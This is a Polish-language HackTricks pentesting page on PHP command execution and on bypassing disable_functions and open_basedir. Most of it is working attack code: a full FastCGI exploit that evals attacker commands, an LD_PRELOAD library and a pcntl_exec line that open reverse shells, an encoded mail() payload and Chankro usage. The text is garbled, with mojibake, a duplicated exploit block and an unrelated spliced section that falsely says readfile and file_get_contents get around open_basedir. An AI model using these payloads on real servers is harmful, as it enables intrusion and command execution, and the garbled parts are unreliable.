# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wykonanie polecenia i kodu w PHP

### Wykonanie polecenia w PHP

**Uwaga:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell mo偶e **automatycznie** sprawdzi i omin nastpujce funkcje, jeli kt贸re z nich jest wyczone.

**exec** - Zwraca ostatni lini wyniku polecenia

```bash
echo exec("uname  -a");
```

**passthru** - Przekazuje wynik polece bezporednio do przegldarki

```bash
echo passthru("uname -a");
```

**system** - Przekazuje wynik polece bezporednio do przegldarki i zwraca ostatni lini

```bash
echo system("uname -a");
```

**shell\_exec** - Zwraca wynik wykonania komendy

```bash
echo shell_exec("uname -a");
```

\`\` (backticks) - To samo co shell\_exec()

```bash
echo `uname -a`
```

**popen** - Otwiera potok do odczytu lub zapisu do procesu komendy

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - Podobne do popen(), ale z wiksz kontrol

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

Funkcja `preg_replace` w PHP jest u偶ywana do wyszukiwania i zamiany wzorc贸w w cigach znak贸w. Przyjmuje trzy argumenty: wzorzec, zastpienie i cig, w kt贸rym ma by wykonana zamiana. Funkcja ta u偶ywa wyra偶e regularnych do dopasowania wzorca i dokonuje zamiany na podstawie zastpienia.

Przykad u偶ycia:

```php
$string = "Hello, World!";
$pattern = "/World/";
$replacement = "Universe";

$result = preg_replace($pattern, $replacement, $string);
echo $result; // Output: Hello, Universe!
```

W powy偶szym przykadzie funkcja `preg_replace` wyszukuje wzorzec "/World/" w cigu znak贸w "$string" i zamienia go na "Universe". Wynik zostaje wywietlony na ekranie.

Funkcja `preg_replace` jest przydatna w wielu scenariuszach, takich jak usuwanie niechcianych znak贸w, formatowanie danych, walidacja danych wejciowych itp.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Wykonuje program (domylnie w nowoczesnym i nie tak nowoczesnym PHP musisz zaadowa modu `pcntl.so`, aby u偶y tej funkcji)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Ta funkcja su偶y do wysyania wiadomoci e-mail, ale mo偶e by r贸wnie偶 wykorzystana do wstrzykiwania dowolnych polece w parametrze `$options`. Dzieje si tak, poniewa偶 **funkcja `mail` w PHP** zazwyczaj wywouje binarny plik `sendmail` w systemie i umo偶liwia dodawanie dodatkowych opcji. Jednak nie bdziesz w stanie zobaczy wyniku wykonanego polecenia, dlatego zaleca si utworzenie skryptu powoki, kt贸ry zapisuje wynik do pliku, wykonanie go za pomoc funkcji mail i wywietlenie wyniku:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Ta funkcja mo偶e by u偶ywana do dynamicznego adowania rozszerzenia PHP. Ta funkcja nie zawsze bdzie dostpna, wic powiniene sprawdzi, czy jest dostpna, zanim spr贸bujesz jej wykorzysta. Przeczytaj [t stron, aby dowiedzie si, jak wykorzysta t funkcj](disable\_functions-bypass-dl-function.md).

### Wykonanie kodu PHP

Opr贸cz eval istniej inne sposoby wykonania kodu PHP: include/require mog by u偶ywane do zdalnego wykonania kodu w postaci podatnoci na lokalne doczanie plik贸w (Local File Include) i zdalne doczanie plik贸w (Remote File Include).

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**Funkcje wyczone** to ustawienie, kt贸re mo偶na skonfigurowa w plikach `.ini` w PHP, kt贸re **zabrania** korzystania z wskazanych **funkcji**. **Open basedir** to ustawienie, kt贸re wskazuje PHP folder, do kt贸rego ma dostp.\
Ustawienie PHP powinno by skonfigurowane w cie偶ce _/etc/php7/conf.d_ lub podobnej.

Obie konfiguracje mo偶na zobaczy w wyniku polecenia **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## open\_basedir Bypass

`open_basedir` skonfiguruje foldery, do kt贸rych PHP ma dostp, nie bdziesz **m贸g zapisywa/odczytywa/wykonuj 偶adnych plik贸w poza** tymi folderami, ale r贸wnie偶 nie bdziesz **m贸g nawet wywietli** innych katalog贸w.\
Jednak jeli w jaki spos贸b jeste w stanie wykona dowolny kod PHP, mo偶esz **spr贸bowa** poni偶szego fragmentu **kodu**, aby spr贸bowa **obej** ograniczenie.

### Wywietlanie katalog贸w za pomoc omijania glob://

W tym pierwszym przykadzie u偶ywany jest protok贸 `glob://` z pewnym omijaniem cie偶ki:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Uwaga1**: W cie偶ce mo偶na r贸wnie偶 u偶y `/e??/*` aby wywietli `/etc/*` i inne foldery.\
**Uwaga2**: Wyglda na to, 偶e cz kodu jest zduplikowana, ale jest to konieczne!\
**Uwaga3**: Ten przykad jest przydatny tylko do wywietlania folder贸w, a nie do odczytywania plik贸w

### Pene obejcie open\_basedir przy wykorzystaniu FastCGI

Jeli chcesz **dowiedzie si wicej o PHP-FPM i FastCGI**, mo偶esz przeczyta [pierwsz sekcj tej strony](disable\_functions-bypass-php-fpm-fastcgi.md).\
Jeli **`php-fpm`** jest skonfigurowany, mo偶na go wykorzysta do cakowitego obejcia **open\_basedir**:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

Zauwa偶, 偶e pierwsz rzecz, kt贸r musisz zrobi, jest znalezienie **gniazda unixowego php-fpm**. Zazwyczaj znajduje si ono w `/var/run`, wic mo偶esz **u偶y wczeniejszego kodu, aby wywietli katalog i je znale藕**.\
Kod pochodzi [std](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Ze 偶danie');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Ta aplikacja nie obsuguje multiplexingu [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Nowe 偶danie odrzucone; zbyt zajty [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Nieznana warto roli [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// prawdziwy exploit zaczyna si tutaj
if (!isset($_REQUEST['cmd'])) {
die("Sprawd藕 swoje dane wejciowe\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Nic nie robi
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```

Ten skrypt bdzie komunikowa si z **gniazdem unixowym php-fpm** (zazwyczaj znajdujcym si w /var/run, jeli jest u偶ywany fpm) w celu wykonania dowolnego kodu. Ustawienia `open_basedir` zostan nadpisane przez atrybut **PHP\_VALUE**, kt贸ry jest wysyany.\
Zauwa偶, jak u偶ywane jest `eval`, aby wykona kod PHP, kt贸ry wysyasz w parametrze **cmd**.\
Zauwa偶 r贸wnie偶 **zakomentowan lini 324**, mo偶esz j odkomentowa, a **payload automatycznie poczy si z podanym adresem URL i wykona zawarty tam kod PHP**.\
Wystarczy wej na stron `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` aby uzyska zawarto pliku `/etc/passwd`.

{% hint style="warning" %}
Mo偶esz pomyle, 偶e tak samo jak nadpisalimy konfiguracj `open_basedir`, mo偶emy **nadpisa `disable_functions`**. Spr贸buj, ale to nie zadziaa, wyglda na to, 偶e **`disable_functions` mo偶na skonfigurowa tylko w pliku konfiguracyjnym `.ini` php**, a zmiany dokonane za pomoc PHP\_VALUE nie bd miay wpywu na t konkretne ustawienie.
{% endhint %}

## Bypass disable\_functions

Jeli masz kod PHP wykonujcy si wewntrz maszyny, prawdopodobnie chcesz przej do nastpnego poziomu i **wykonywa dowolne polecenia systemowe**. W tej sytuacji zwykle odkrywasz, 偶e wikszo lub wszystkie **funkcje PHP**, kt贸re pozwalaj na **wykonywanie polece systemowych, zostay wyczone** w **`disable_functions`.**\
Zobaczmy wic, jak mo偶esz omin to ograniczenie (jeli mo偶esz).

### Automatyczne odkrywanie omijania

Mo偶esz u偶y narzdzia [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), kt贸re wska偶e, kt贸ra funkcja (jeli istnieje) mo偶e zosta u偶yta do **ominicia** **`disable_functions`**.

### Ominicie za pomoc innych funkcji systemowych

Po prostu wr贸 na pocztek tej strony i **sprawd藕, czy kt贸ra z funkcji wykonujcych polecenia nie jest wyczona i dostpna w rodowisku**. Jeli znajdziesz przynajmniej jedn z nich, bdziesz m贸g jej u偶y do wykonania dowolnych polece systemowych.

### Ominicie za pomoc LD\_PRELOAD

Wiadomo, 偶e niekt贸re funkcje w PHP, takie jak `mail()`, **wykonuj binaria wewntrz systemu**. Mo偶esz wic je wykorzysta, u偶ywajc zmiennej rodowiskowej `LD_PRELOAD`, aby spowodowa zaadowanie dowolnej biblioteki, kt贸ra mo偶e wykonywa cokolwiek.

#### Funkcje, kt贸re mo偶na u偶y do ominicia disable\_functions za pomoc LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Skuteczne, gdy zainstalowany jest modu `php-mbstring`.
* **`imap_mail`**: Dziaa, jeli jest obecny modu `php-imap`.
* **`libvirt_connect`**: Wymaga moduu `php-libvirt-php`.
* **`gnupg_init`**: Mo偶liwe do wykorzystania z zainstalowanym moduem `php-gnupg`.
* **`new imagick()`**: Ta klasa mo偶e by wykorzystana do ominicia ogranicze. Szczeg贸owe techniki eksploatacji mo偶na znale藕 w obszernym [**opisie tutaj**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Mo偶esz [**znale藕 tutaj**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skrypt fuzzingowy, kt贸ry zosta u偶yty do znalezienia tych funkcji.

Oto biblioteka, kt贸r mo偶esz skompilowa, aby wykorzysta zmienn rodowiskow `LD_PRELOAD`:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Ominicie za pomoc Chankro

Aby wykorzysta t nieprawidow konfiguracj, mo偶esz u偶y [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Jest to narzdzie, kt贸re **generuje exploit PHP**, kt贸ry musisz przesa na podatny serwer i go uruchomi (uzyska do niego dostp za porednictwem sieci).\
**Chankro** zapisze na dysku ofiary **bibliotek i odwr贸con powok**, kt贸r chcesz uruchomi, i u偶yje sztuczki\*\*`LD_PRELOAD` + funkcji PHP `mail()`\*\* do uruchomienia odwr贸conej powoki.

Nale偶y zauwa偶y, 偶e w celu u偶ycia **Chankro**, `mail` i `putenv` **nie mog znajdowa si na licie `disable_functions`**.\
W poni偶szym przykadzie mo偶esz zobaczy, jak **utworzy exploit Chankro** dla **architektury 64-bitowej**, kt贸ry bdzie wykonywa polecenie `whoami` i zapisze wynik w _/tmp/chankro\_shell.out_, Chankro **zapisze bibliotek i payload** w _/tmp_, a **ostateczny exploit** bdzie nosi nazw **bicho.php** (to jest plik, kt贸ry musisz przesa na serwer ofiary):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```

### Funkcje PHP przydatne do wyczania funkcji disable\_functions i bypassowania open\_basedir

W niekt贸rych przypadkach, podczas testowania penetracyjnego aplikacji internetowych napisanych w PHP, mo偶emy napotka na ograniczenia, takie jak wyczone funkcje PHP lub ustawiony parametr open\_basedir. W takich sytuacjach istniej pewne funkcje PHP, kt贸re mog pom贸c nam obej te ograniczenia.

#### Wyczanie funkcji PHP

W przypadku, gdy administrator wyczy pewne funkcje PHP, mo偶emy spr贸bowa u偶y innych funkcji, kt贸re wykonuj podobne zadania. Oto kilka przykad贸w:

* `exec()` - Mo偶emy u偶y funkcji `shell_exec()` lub `system()` zamiast `exec()`, aby wykona polecenie systemowe.
* `passthru()` - Mo偶emy u偶y funkcji `system()` lub `shell_exec()` zamiast `passthru()`, aby wykona polecenie systemowe i przekaza wynik bezporednio na wyjcie.
* `popen()` - Mo偶emy u偶y funkcji `proc_open()` zamiast `popen()`, aby uruchomi proces i uzyska dostp do jego strumienia wejciowego/wyjciowego.
* `system()` - Mo偶emy u偶y funkcji `exec()` lub `shell_exec()` zamiast `system()`, aby wykona polecenie systemowe.

#### Bypassowanie parametru open\_basedir

Parametr open\_basedir jest u偶ywany do ograniczenia dostpu do plik贸w i katalog贸w w PHP. Jeli jest ustawiony, PHP nie bdzie m贸g otworzy plik贸w spoza okrelonej cie偶ki. Istniej jednak pewne funkcje PHP, kt贸re mog pom贸c nam obej ten parametr:

* `readfile()` - Mo偶emy u偶y funkcji `readfile()` do odczytu zawartoci pliku spoza okrelonej cie偶ki.
* `file_get_contents()` - Mo偶emy u偶y funkcji `file_get_contents()` do odczytu zawartoci pliku spoza okrelonej cie偶ki.
* `file_put_contents()` - Mo偶emy u偶y funkcji `file_put_contents()` do zapisu zawartoci pliku spoza okrelonej cie偶ki.
* `fopen()` - Mo偶emy u偶y funkcji `fopen()` z parametrem "r+" lub "w" do otwarcia pliku spoza okrelonej cie偶ki w trybie odczytu lub zapisu.

Pamitaj, 偶e wykorzystywanie tych funkcji do obejcia ogranicze mo偶e by nielegalne i narusza zasady etyczne. Zawsze przestrzegaj praw i przepis贸w obowizujcych w Twoim kraju.

```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Jeli zauwa偶ysz, 偶e funkcja **mail** jest zablokowana przez wyczone funkcje, nadal mo偶esz u偶y funkcji **mb\_send\_mail**.\
Wicej informacji na temat tej techniki i Chankro znajdziesz tutaj: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" za pomoc mo偶liwoci PHP

Nale偶y zauwa偶y, 偶e za pomoc **PHP** mo偶na **odczytywa i zapisywa pliki, tworzy katalogi i zmienia uprawnienia**.\
Mo偶na nawet **wykonywa zrzuty baz danych**.\
Mo偶e za pomoc **PHP** i **wyliczenia** pudeka znajdziesz spos贸b na eskalacj uprawnie/wykonanie polece (na przykad odczytanie pewnego prywatnego klucza ssh).

Stworzyem webshell, kt贸ry uatwia wykonywanie tych czynnoci (nale偶y pamita, 偶e wikszo webshelli oferuje r贸wnie偶 te opcje): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypassy zale偶ne od modu贸w/wersji

Istnieje kilka sposob贸w na obejcie wyczonych funkcji, jeli u偶ywany jest jaki konkretny modu lub wykorzystuje si okrelon wersj PHP:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass z u偶yciem FFI - Foreign Function Interface enabled**](https://github.com/carlospolop/hacktricks/blob/pl/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass za pomoc mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**Rozszerzenie PHP Perl Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**Funkcja dl**](disable\_functions-bypass-dl-function.md)
* [**Ten exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - podatne na drobne zmiany w PoC
* 7.0 - wszystkie wersje do tej pory
* 7.1 - wszystkie wersje do tej pory
* 7.2 - wszystkie wersje do tej pory
* 7.3 - wszystkie wersje do tej pory
* 7.4 - wszystkie wersje do tej pory
* 8.0 - wszystkie wersje do tej pory
* [**Od wersji 7.0 do 8.0 exploit (tylko Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
